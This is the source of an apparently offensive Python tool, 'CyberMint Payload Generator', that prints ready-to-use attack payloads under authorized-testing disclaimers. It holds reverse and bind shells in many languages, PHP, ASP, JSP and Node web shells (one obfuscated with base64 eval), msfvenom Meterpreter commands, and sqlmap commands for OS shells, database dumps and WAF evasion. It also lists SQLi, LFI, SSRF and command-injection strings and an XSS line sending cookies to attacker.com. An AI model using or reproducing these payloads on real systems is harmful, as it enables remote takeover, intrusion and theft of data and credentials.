"""
CyberMint Payload Generator
Reverse shells, bind shells, web shells, MSFvenom builder, exploit reference.
FOR AUTHORIZED PENETRATION TESTING AND SECURITY RESEARCH ONLY.
"""
import base64
import urllib.parse
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt
from rich import box
from rich import syntax

from core.logger import get_logger
from ui.theme import theme

console = Console()
logger  = get_logger("Payload")


def show_menu(current_project=None):
    while True:
        console.clear()
        theme.banner("PAYLOAD GENERATOR", "For Authorized Penetration Testing Only")
        console.print("  [bold red]⚠  Use only on systems you own or have explicit permission to test.[/bold red]\n")

        options = [
            ("[01]", "Reverse Shell Generator", "All languages: Python, Bash, PHP, PowerShell..."),
            ("[02]", "Bind Shell Generator",    "Listener-based shells"),
            ("[03]", "Web Shell Snippets",      "PHP, Python, Perl web shells"),
            ("[04]", "MSFvenom Command Builder","Metasploit payload commands"),
            ("[05]", "SQLMap Command Builder",  "SQLMap injection commands"),
            ("[06]", "Payload Encoder",         "Encode payloads (Base64, URL, hex)"),
            ("[07]", "Common Exploit Ref",      "OWASP/exploit technique reference"),
            ("[08]", "Custom Command Injector", "Build OS command injection strings"),
            ("[00]", "Back to Main Menu",       ""),
        ]
        theme.menu_table(options)
        choice = theme.get_choice()

        if choice == "00":
            break
        elif choice == "01":
            _reverse_shell_gen()
        elif choice == "02":
            _bind_shell_gen()
        elif choice == "03":
            _web_shells()
        elif choice == "04":
            _msfvenom_builder()
        elif choice == "05":
            _sqlmap_builder()
        elif choice == "06":
            _payload_encoder()
        elif choice == "07":
            _exploit_reference()
        elif choice == "08":
            _command_injection()


def _get_lhost_lport():
    lhost = Prompt.ask("  [cyan]LHOST (your IP)[/cyan]", default="10.10.10.10")
    lport = Prompt.ask("  [cyan]LPORT[/cyan]", default="4444")
    return lhost, lport


def _show_payload(title, payload, lang="bash"):
    console.print(Panel(
        f"[bold white]{payload}[/bold white]",
        title=f"[bold cyan][ {title} ][/bold cyan]",
        border_style="cyan",
        padding=(1, 2),
    ))


# ── Reverse Shell Generator ───────────────────────────────────────────────────

REVERSE_SHELLS = {
    "bash_tcp": {
        "name": "Bash TCP",
        "shell": 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
    },
    "bash_udp": {
        "name": "Bash UDP",
        "shell": 'bash -i >& /dev/udp/{lhost}/{lport} 0>&1',
    },
    "bash_196": {
        "name": "Bash (196)",
        "shell": '0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196',
    },
    "python3": {
        "name": "Python 3",
        "shell": 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
    },
    "python2": {
        "name": "Python 2",
        "shell": 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
    },
    "php": {
        "name": "PHP",
        "shell": 'php -r \'$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");\'',
    },
    "php_exec": {
        "name": "PHP (exec)",
        "shell": 'php -r \'$s=fsockopen("{lhost}",{lport});$proc=proc_open("/bin/sh -i",array(0=>$s,1=>$s,2=>$s),$pipes);\'',
    },
    "perl": {
        "name": "Perl",
        "shell": 'perl -e \'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
    },
    "ruby": {
        "name": "Ruby",
        "shell": 'ruby -rsocket -e\'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
    },
    "netcat": {
        "name": "Netcat",
        "shell": 'nc -e /bin/sh {lhost} {lport}',
    },
    "netcat_noe": {
        "name": "Netcat (no -e)",
        "shell": 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f',
    },
    "java": {
        "name": "Java",
        "shell": 'r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])\np.waitFor()',
    },
    "powershell": {
        "name": "PowerShell",
        "shell": 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{lhost}\',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"',
    },
    "powershell_b64": {
        "name": "PowerShell Base64",
        "shell": None,  # Generated dynamically
    },
    "awk": {
        "name": "AWK",
        "shell": 'awk \'BEGIN {{s = "/inet/tcp/0/{lhost}/{lport}"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}}\'',
    },
    "socat": {
        "name": "Socat",
        "shell": 'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}',
    },
    "golang": {
        "name": "Go",
        "shell": 'echo \'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{lhost}:{lport}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}\' > /tmp/t.go && go run /tmp/t.go &',
    },
    "nodejs": {
        "name": "Node.js",
        "shell": '''(function(){{var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect({lport},"{lhost}",function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});return /a/;}})();''',
    },
}


def _reverse_shell_gen():
    console.clear()
    theme.section_header("REVERSE SHELL GENERATOR")
    lhost, lport = _get_lhost_lport()

    t = Table(box=box.SIMPLE, header_style="bold cyan", border_style="dim cyan")
    t.add_column("#",    width=4,  style="dim")
    t.add_column("Name", style="bold white", min_width=20)
    for i, (key, info) in enumerate(REVERSE_SHELLS.items(), 1):
        t.add_row(str(i), info["name"])

    console.print(t)
    console.print("\n  [dim]Listener: nc -lvnp {lport}[/dim]".format(lport=lport))

    idx = Prompt.ask("\n  [cyan]Select shell # (or 0 for all)[/cyan]", default="1")

    shells = list(REVERSE_SHELLS.values())
    try:
        num = int(idx)
        to_show = shells if num == 0 else [shells[num - 1]]
    except (ValueError, IndexError):
        to_show = [shells[0]]

    for info in to_show:
        if info["name"] == "PowerShell Base64":
            cmd = f'$client = New-Object System.Net.Sockets.TCPClient(\'{lhost}\',{lport})'
            b64 = base64.b64encode(cmd.encode("utf-16-le")).decode()
            payload = f"powershell -EncodedCommand {b64}"
        else:
            payload = info["shell"].format(lhost=lhost, lport=lport) if info["shell"] else ""
        if payload:
            _show_payload(info["name"], payload)

    console.print(f"\n  [bold cyan]Listener command:[/bold cyan]")
    console.print(f"  [bold white]nc -lvnp {lport}[/bold white]")
    console.input("\n  Press Enter to continue...")


# ── Bind Shell Generator ──────────────────────────────────────────────────────

def _bind_shell_gen():
    console.clear()
    theme.section_header("BIND SHELL GENERATOR")
    lport = Prompt.ask("  [cyan]LPORT (port to bind on target)[/cyan]", default="4444")

    shells = [
        ("Python 3",    f'python3 -c \'import socket,subprocess,os;s=socket.socket();s.bind(("",{lport}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"])\''),
        ("Netcat",      f'nc -lvnp {lport} -e /bin/bash'),
        ("Perl",        f'perl -e \'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);bind(S,sockaddr_in({lport},INADDR_ANY));listen(S,1);accept(C,S);open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh -i");\''),
        ("Socat",       f'socat TCP-LISTEN:{lport},reuseaddr,fork EXEC:/bin/sh'),
        ("PowerShell",  f'powershell -c "$listener=New-Object System.Net.Sockets.TcpListener(\'0.0.0.0\',{lport});$listener.Start();$client=$listener.AcceptTcpClient();$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){{$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$ret=(iex $data 2>&1|Out-String);$ret2=$ret+\'PS>  \';$b=([text.encoding]::ASCII).GetBytes($ret2);$stream.Write($b,0,$b.Length);$stream.Flush()}};$client.Close()"'),
    ]

    for name, payload in shells:
        _show_payload(f"Bind Shell — {name}", payload)

    console.print(f"\n  [bold cyan]Connect from attacker:[/bold cyan]")
    console.print(f"  [bold white]nc <TARGET_IP> {lport}[/bold white]")
    console.input("\n  Press Enter to continue...")


# ── Web Shells ────────────────────────────────────────────────────────────────

def _web_shells():
    console.clear()
    theme.section_header("WEB SHELL SNIPPETS")
    console.print("  [bold red]⚠  Deploy only on systems you own or are authorized to test.[/bold red]\n")

    shells = [
        ("PHP — cmd param",
         '<?php if(isset($_REQUEST["cmd"])){system($_REQUEST["cmd"]);}?>'),
        ("PHP — eval (obfuscated)",
         '<?php @eval(base64_decode($_POST["cmd"]));?>'),
        ("PHP — passthru",
         '<?php passthru($_GET["cmd"]);?>'),
        ("PHP — popen",
         '<?php $handle=popen($_GET["cmd"],"r");while(!feof($handle)){echo fread($handle,4096);}pclose($handle);?>'),
        ("PHP — full shell",
         '<?php system($_GET["c"]." 2>&1");?>'),
        ("Python (Flask mini)",
         'from flask import Flask,request,os\napp=Flask(__name__)\n@app.route("/shell")\ndef s():return os.popen(request.args.get("c","id")).read()\napp.run(host="0.0.0.0",port=8080)'),
        ("Perl CGI",
         '#!/usr/bin/perl\nuse CGI qw(:standard);\nprint header;\nprint `$ENV{\'QUERY_STRING\'}`;\n'),
        ("ASP (VBScript)",
         '<%Set oS=Server.CreateObject("WSCRIPT.SHELL"):Call oS.Run("cmd.exe /c "&Request.Form("cmd"),0,True)%>'),
        ("JSP",
         '<%Runtime rt=Runtime.getRuntime();String[]c={"/bin/sh","-c",request.getParameter("cmd")};Process proc=rt.exec(c);out.println(new String(proc.getInputStream().readAllBytes()));%>'),
        ("Node.js",
         'require("http").createServer((req,res)=>{require("child_process").exec(new URL(req.url,"http://x").searchParams.get("c"),(e,o)=>res.end(o));}).listen(8080);'),
    ]

    for name, payload in shells:
        _show_payload(name, payload)

    console.input("\n  Press Enter to continue...")


# ── MSFvenom Builder ──────────────────────────────────────────────────────────

def _msfvenom_builder():
    console.clear()
    theme.section_header("MSFvenom COMMAND BUILDER")

    lhost, lport = _get_lhost_lport()
    os_type  = Prompt.ask("  [cyan]Target OS[/cyan]", choices=["linux","windows","android","osx"], default="linux")
    arch     = Prompt.ask("  [cyan]Architecture[/cyan]", choices=["x86","x64","arm","aarch64"], default="x64")
    fmt      = Prompt.ask("  [cyan]Format[/cyan]", choices=["elf","exe","apk","macho","raw","py","war","jar","asp","aspx","php"], default="elf")
    encoder  = Prompt.ask("  [cyan]Encoder (blank=none)[/cyan]", default="")
    out      = Prompt.ask("  [cyan]Output file[/cyan]", default=f"shell.{fmt}")

    payload_map = {
        "linux":   {"x86": "linux/x86/meterpreter/reverse_tcp",
                    "x64": "linux/x64/meterpreter/reverse_tcp",
                    "arm": "linux/armle/shell/reverse_tcp",
                    "aarch64":"linux/aarch64/shell_reverse_tcp"},
        "windows": {"x86": "windows/meterpreter/reverse_tcp",
                    "x64": "windows/x64/meterpreter/reverse_tcp",
                    "arm": "windows/meterpreter/reverse_tcp",
                    "aarch64":"windows/meterpreter/reverse_tcp"},
        "android": {"arm": "android/meterpreter/reverse_tcp",
                    "aarch64":"android/meterpreter/reverse_tcp",
                    "x86":"android/meterpreter/reverse_tcp",
                    "x64":"android/meterpreter/reverse_tcp"},
        "osx":     {"x86": "osx/x86/shell_reverse_tcp",
                    "x64": "osx/x64/shell_reverse_tcp",
                    "arm": "osx/x64/shell_reverse_tcp",
                    "aarch64":"osx/x64/shell_reverse_tcp"},
    }

    payload = payload_map.get(os_type, {}).get(arch, "linux/x64/meterpreter/reverse_tcp")
    enc_str = f"-e {encoder} -i 5" if encoder else ""

    cmd = (f"msfvenom -p {payload} "
           f"LHOST={lhost} LPORT={lport} "
           f"-f {fmt} {enc_str} -o {out}")

    _show_payload("MSFvenom Command", cmd)

    console.print("\n  [bold cyan]Start handler in Metasploit:[/bold cyan]")
    handler = (f"use exploit/multi/handler\n"
               f"set payload {payload}\n"
               f"set LHOST {lhost}\n"
               f"set LPORT {lport}\n"
               f"run")
    console.print(Panel(handler, border_style="dim cyan"))
    console.input("\n  Press Enter to continue...")


# ── SQLMap Builder ────────────────────────────────────────────────────────────

def _sqlmap_builder():
    console.clear()
    theme.section_header("SQLMap COMMAND BUILDER")

    url    = Prompt.ask("  [cyan]Target URL[/cyan]")
    level  = Prompt.ask("  [cyan]Level (1-5)[/cyan]", default="3")
    risk   = Prompt.ask("  [cyan]Risk (1-3)[/cyan]", default="2")
    dbms   = Prompt.ask("  [cyan]DBMS (blank=auto)[/cyan]", default="")
    data   = Prompt.ask("  [cyan]POST data (blank=GET)[/cyan]", default="")
    cookie = Prompt.ask("  [cyan]Cookie (blank=none)[/cyan]", default="")

    cmd = f"sqlmap -u '{url}' --level={level} --risk={risk} --batch --dbs"
    if dbms:
        cmd += f" --dbms={dbms}"
    if data:
        cmd += f" --data='{data}'"
    if cookie:
        cmd += f" --cookie='{cookie}'"

    _show_payload("Basic SQLMap", cmd)

    extras = [
        ("Dump all",       cmd + " --dump-all"),
        ("Get shell",      cmd + " --os-shell"),
        ("Tamper scripts", cmd + " --tamper=space2comment,between"),
        ("WAF bypass",     cmd + " --random-agent --tor --check-tor"),
        ("Tables only",    cmd + " --tables"),
    ]
    for name, c in extras:
        _show_payload(name, c)

    console.input("\n  Press Enter to continue...")


# ── Payload Encoder ───────────────────────────────────────────────────────────

def _payload_encoder():
    console.clear()
    theme.section_header("PAYLOAD ENCODER")

    payload = Prompt.ask("  [cyan]Payload to encode[/cyan]")
    method  = Prompt.ask("  [cyan]Method[/cyan]",
                          choices=["base64","url","double-url","hex","hex-escape"],
                          default="base64")

    if method == "base64":
        result = base64.b64encode(payload.encode()).decode()
    elif method == "url":
        result = urllib.parse.quote(payload)
    elif method == "double-url":
        result = urllib.parse.quote(urllib.parse.quote(payload))
    elif method == "hex":
        result = payload.encode().hex()
    elif method == "hex-escape":
        result = "".join(f"\\x{c:02x}" for c in payload.encode())
    else:
        result = payload

    _show_payload(f"Encoded ({method})", result)
    console.input("\n  Press Enter to continue...")


# ── Exploit Reference ─────────────────────────────────────────────────────────

def _exploit_reference():
    console.clear()
    theme.section_header("COMMON EXPLOIT REFERENCE")

    categories = {
        "SQLI Quick Tests": [
            "' OR '1'='1  →  Basic auth bypass",
            "' OR 1=1--   →  MySQL comment bypass",
            "1; WAITFOR DELAY '0:0:5'--  →  MSSQL time-based",
            "' UNION SELECT NULL,NULL,NULL--  →  Union-based",
            "'; EXEC xp_cmdshell('whoami')--  →  RCE via MSSQL",
        ],
        "XSS Payloads": [
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror='fetch(\"//attacker.com?\"+document.cookie)'>",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)  →  href injection",
            "'-alert(1)-'  →  JS string break",
        ],
        "LFI Paths": [
            "../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "....//....//etc/passwd",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "/proc/self/environ  →  env-based RCE",
        ],
        "SSRF Targets": [
            "http://169.254.169.254/latest/meta-data/  →  AWS meta",
            "http://metadata.google.internal/  →  GCP meta",
            "http://169.254.169.254/metadata/v1/  →  Azure meta",
            "http://localhost:22/  →  Port scan via SSRF",
            "file:///etc/passwd  →  File read",
        ],
        "Command Injection": [
            "; id",  "| id",  "` id`",  "$(id)",
            "& whoami &",  "|| id",  "&& id",
            "; ping -c 3 attacker.com",
        ],
        "Linux Privesc Quick": [
            "sudo -l  →  check sudo rights",
            "find / -perm -4000 2>/dev/null  →  SUID binaries",
            "cat /etc/crontab  →  cron jobs",
            "env  →  check env variables",
            "cat /etc/passwd | grep -v nologin",
        ],
    }

    for section, items in categories.items():
        console.print(f"\n  [bold cyan]── {section} ──[/bold cyan]")
        for item in items:
            console.print(f"  [dim]•[/dim] [white]{item}[/white]")

    console.input("\n  Press Enter to continue...")


# ── Command Injection Builder ─────────────────────────────────────────────────

def _command_injection():
    console.clear()
    theme.section_header("COMMAND INJECTION BUILDER")

    cmd    = Prompt.ask("  [cyan]Command to inject (e.g. id, whoami)[/cyan]", default="id")
    method = Prompt.ask("  [cyan]Injection style[/cyan]",
                         choices=["semicolon","pipe","ampersand","backtick","dollar","newline"],
                         default="semicolon")

    injections = {
        "semicolon":  f"; {cmd}",
        "pipe":       f"| {cmd}",
        "ampersand":  f"& {cmd} &",
        "backtick":   f"`{cmd}`",
        "dollar":     f"$({cmd})",
        "newline":    f"\n{cmd}\n",
    }

    base = injections.get(method, f"; {cmd}")

    variants = [
        ("Direct",         base),
        ("URL Encoded",    urllib.parse.quote(base)),
        ("Double Encoded", urllib.parse.quote(urllib.parse.quote(base))),
        ("Null Byte",      base + "%00"),
        ("CRLF",          base.replace("\n", "%0d%0a")),
    ]

    for name, payload in variants:
        _show_payload(name, payload)

    console.input("\n  Press Enter to continue...")
